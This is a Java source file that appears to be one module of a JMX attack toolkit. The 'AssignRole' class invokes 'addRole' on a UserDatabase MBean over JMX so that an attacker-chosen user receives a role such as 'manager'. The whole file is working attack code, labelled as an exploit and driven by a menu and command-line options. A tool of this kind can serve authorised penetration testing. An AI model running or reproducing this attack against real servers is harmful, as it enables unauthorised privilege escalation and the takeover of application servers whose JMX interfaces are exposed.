package jmxattacks;

import javax.management.ObjectName;

import jmxmenus.MainMenu;
import jmxutils.EasyBasicParser;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

public class AssignRole extends Attack{
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--username user --role manager";
	String description = "This attack will attribute a role to a user";
	String name = "AssignRole";
	private String role;
	private String username;
	private ObjectName object ;
	private String mbean = "Users:type=User,username=";
	private String operation = "addRole";
	
	public AssignRole()
	{
		
		this.setAttack_description(description);
		this.setAttack_name(name);	
	}
	
	public void prepareExploit(String arg)
	{
		this.setAttack_description(description);
		this.setAttack_name(name);	
		Parser parser = new EasyBasicParser();
		CommandLine line = null;
		try {
			line = parser.parse( this.setArgs(), StringtoArrayList(arg));
		} catch (ParseException e) {
			System.err.println( "Parsing failed.  Reason: " + e.getMessage() );
			System.exit(-1);
		}
				
		if (line != null)
		{
		    this.role = line.getOptionValue("role");
		    this.username = line.getOptionValue("username");
		   	this.object = createObject(this.mbean+"\""+this.username+"\""+",database=UserDatabase");
		    System.out.println("#### " +this.operation+ " operation will be invoke ####");
		    this.exploit();
		    System.out.println("Role should be assigned");
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				System.out.println(e.getMessage());	
			}
		}

	}
	
	public void prepareExploit() {
		
		System.out.println(this.name+" exploit selected");
			// Display Menu to retrieve options
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			
			if (line != null)
			{
			   	this.role = line.getOptionValue("role");
			   	this.username = line.getOptionValue("username");
			   	this.object = createObject(this.mbean+"\""+this.username+"\""+",database=UserDatabase");
			   	System.out.println("#### " +this.operation+ " operation will be invoke ####");
			    this.exploit();
			    System.out.println("Role should be assigned");
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e) {
					System.out.println(e.getMessage());	
				}	
			}
		
			MainMenu menu = new MainMenu();
		
	}

	
	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		   options.addOption(OptionBuilder
			       .withArgName("role")
			       .withLongOpt("role")
			       .hasArg()
			       .isRequired()
			       .withDescription("role")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("username")
			       .withLongOpt("username")
			       .hasArg()
			       .isRequired()
			       .withDescription("username")
			       .create());
		   
		   
		   return options;
	}
	
	public void exploit()
	{
		// Prepare createStandardHost invocation
				
		        Object[] a = new Object[1];
		        a[0] = this.role;
		        String[] b = new String[1];
		        b[0] = "java.lang.String";		       
		   // Invoke createStandardHost
				invoke(this.object,this.operation,a, b);
				
	}

}
